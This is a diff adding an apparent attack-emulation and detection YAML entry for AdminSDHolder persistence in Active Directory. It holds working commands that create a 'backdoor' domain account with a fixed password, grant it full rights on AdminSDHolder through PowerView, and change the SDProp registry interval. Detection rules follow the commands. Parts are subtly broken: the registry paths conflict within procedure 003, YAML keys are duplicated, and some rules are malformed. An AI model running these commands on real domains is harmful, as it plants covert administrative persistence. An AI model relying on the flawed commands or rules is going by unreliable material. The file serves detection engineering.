@@ -1,0 +1,124 @@
+tactics:
+  - TA0003 - Persistence
+technique:
+  - TXXXX - Active Directory object ACL manipulation
+subtechnique:
+  - TXXXX.001 - AdminSDHolder
+description: >
+  AdminSDHolder is an object in Active Directory that acts as a security descriptor template for protected accounts and groups in an Active Directory domain.
+  After domain compromise, an attacker may change AdminSDHolder object ACL and gain full access to other AD objects including administrative users and groups.
+procedures:
+  procedure AdminSDHolder-001:
+    description: >
+      An adversary needs to set AdminSDHolder Active Directory object ACL for backdoored user account.
+    links:
+      - https://adsecurity.org/?p=1906
+      - https://www.lepide.com/blog/what-is-an-adminsdholder-attack-and-how-to-defend-against-it/
+      - http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/
+    emulation:
+      description: >
+        Create a new AD user with net.exe/powershell or use already compromised existing user account.
+        Use Add-DomainObjectAcl cmdlet to set required AdminSDHolder ACL for previously created user account.
+      tools:
+        - net.exe
+        - New-ADUser cmdlet (ActiveDirectory module)
+        - Add-DomainObjectAcl cmdlet (PowerView, PowerSploit, Empire etc).
+      cmd:
+        - net user backdoor SecretP@ss123 /add /domain 
+      powershell:
+        - Import-Module ActiveDirectory
+        - New-ADUser -SamAccountName "backdoor" -AccountPassword(Read-Host -AsSecureString "SecretP@ss123") -Enabled $true
+        - . ./PowerView.ps1
+        - Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=cybercorp,DC=com' -PrincipalIdentity backdoor -Rights All -Verbose
+    detection:
+      ideas: >
+        - monitor AdminSDHolder AD object ACL changes, such activity is very suspicious.
+      telemetry:
+        ad_object_modification:
+          - Windows EID 5136
+      rules:
+        - Channel:Windows-Security AND EventID:5136 AND ObjectDN:*AdminSDHolder* AND AttributeLDAPDisplayName:*nTSecurityDescriptor*
+      ideas: >
+        - monitor specific Powershell cmdlets execution changing AdminSDHolder ACL.
+      telemetry:
+        script_execution:
+          - Windows Powershell/Operational EID 4104 (Warning)
+          - EDR (Microsoft-Windows-PowerShell ETW)
+      rules:
+        - Channel:Windows-Powershell-Operational AND EventID:4104 AND ScriptBlockText:"*Add-DomainObjectAcl*" AND ScriptBlockText:*AdminSDHolder*
+  procedure AdminSDHolder-002:      
+    description: >
+      Adversary may discover SDProp process registry settings to check current settings value.
+    emulation:
+      tools:
+        - reg.exe
+        - Get-ItemProperty Powershell cmdlet/aliases
+        - pwsh.exe
+      cmd:
+        - reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency
+        - powershell -command "gpv -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name AdminSDProtectFrequency"
+        - pwsh -c "gpv -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name AdminSDProtectFrequency"
+      powershell:
+        - Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name AdminSDProtectFrequency
+        - gp -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name AdminSDProtectFrequency
+        - gpv -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name AdminSDProtectFrequency
+    detection:
+      ideas: >
+        - monitor reg.exe query execution with AdminSDProtectFrequency in command line.
+        - monitor Powershell Get-ItemProperty cmdlet/aliases calls with AdminSDProtectFrequency in command line.
+      telemetry:
+        process_create:
+          - Windows EID 4688 
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+        script_execution:
+          - Windows Powersell EID 400
+          - EDR (Microsoft-Windows-PowerShell ETW)
+      rules:
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\reg.exe" OR ProcessCommandLine:"*reg *") AND ProcessCommandLine:"* query *" AND ProcessCommandLine:"\\Services\\NTDS\\Parameters"
+          AND ProcessCommandLine:*AdminSDProtectFrequency*
+        - Channel:Sysmon AND EventID:1 AND (Image:"\\reg.exe" OR CommandLine:"*reg *") AND CommandLine:"* query * AND CommandLine:"\\Services\\NTDS\\Parameters"
+          AND CommandLine:*AdminSDProtectFrequency*
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:("\\powershell.exe" OR "\\pwsh.exe") OR ProcessCommandLine:("*powershell *" OR "*pwsh *")) 
+          AND ProcessCommandLine:("Get-ItemProperty" OR "*gp *" OR "*gpv *") AND ProcessCommandLine:"\\Services\\NTDS\\Parameters" AND ProcessCommandLine:*AdminSDProtectFrequency* 
+        - Channel:Sysmon AND EventID:1 AND (Image:("\\powershell.exe" OR "\\pwsh.exe") OR CommandLine:("*powershell *" OR "*pwsh *")) 
+          AND CommandLine:("Get-ItemProperty" OR "*gp *" OR "*gpv *") AND CommandLine:"\\Services\\NTDS\\Parameters" AND CommandLine:*AdminSDProtectFrequency*
+        - Channel:Powershell AND EventID:400 AND HostApplication:("Get-ItemProperty" OR "*gp *" OR "*gpv *") AND HostApplication:"\\Services\\NTDS\\Parameters"
+          AND HostApplication:*AdminSDProtectFrequency*
+  procedure AdminSDHolder-003:      
+    description: >
+      Adversary may change default SDProp process registry setting (60 mins) to accelerate obtaining persistense.
+    emulation:
+      tools:
+        - reg.exe
+        - Set-ItemProperty/New-ItemProperty cmdlets/aliases
+      cmd:
+        - reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 500
+        - powershell -command "sp -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name AdminSDProtectFrequency -Value 500"
+        - pwsh -c "sp -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name AdminSDProtectFrequency -Value 500"
+      powershell:
+        - sp -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name AdminSDProtectFrequency -Value 500
+        - New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name AdminSDProtectFrequency -Value 500
+    detection:
+      ideas: >
+        - monitor "reg.exe add" calls with AdminSDProtectFrequency parameter in command line.
+        - monitor Powershell Set-ItemProperty/New-ItemProperty cmdlets/aliases calls with AdminSDProtectFrequency in command line.
+      telemetry:
+        process_create:
+          - Windows EID 4688 
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+        script_execution:
+          - Windows Powersell EID 400
+          - EDR (Microsoft-Windows-PowerShell ETW)
+      rules:
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\reg.exe" OR CommandLine:"*reg *") AND CommandLine:"* add *" AND CommandLine:"\\Services\\NTDS\\Parameters"
+          AND CommandLine:*AdminSDProtectFrequency*
+        - Channel:Sysmon AND EventID:1 AND (Image:"\\reg.exe" OR CommandLine:"*reg *") AND CommandLine:"* add *" AND CommandLine:"\\Services\\NTDS\\Parameters"
+          AND CommandLine:*AdminSDProtectFrequency*
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:("\\powershell.exe" OR "\\pwsh.exe") OR ProcessCommandLine:("*powershell *" OR "*pwsh *")) 
+          AND ProcessCommandLine:("Set-ItemProperty" OR "*sp *" OR "New-ItemProperty") AND ProcessCommandLine:"\\Services\\NTDS\\Parameters" AND ProcessCommandLine:*AdminSDProtectFrequency*
+        - Channel:Sysmon AND EventID:1 (Image:("\\powershell.exe" OR "\\pwsh.exe") OR CommandLine:("*powershell *" OR "*pwsh *")) AND 
+          CommandLine:("Set-ItemProperty" OR "*sp *" OR "New-ItemProperty") AND CommandLine:"\\Services\\NTDS\\Parameters" AND CommandLine:*AdminSDProtectFrequency*
+        - Channel:Powershell AND EventID:400 AND HostApplication:("Set-ItemProperty" OR "*sp *" OR "New-ItemProperty") AND HostApplication:"\\Services\\NTDS\\Parameters"
+          AND HostApplication:*AdminSDProtectFrequency*
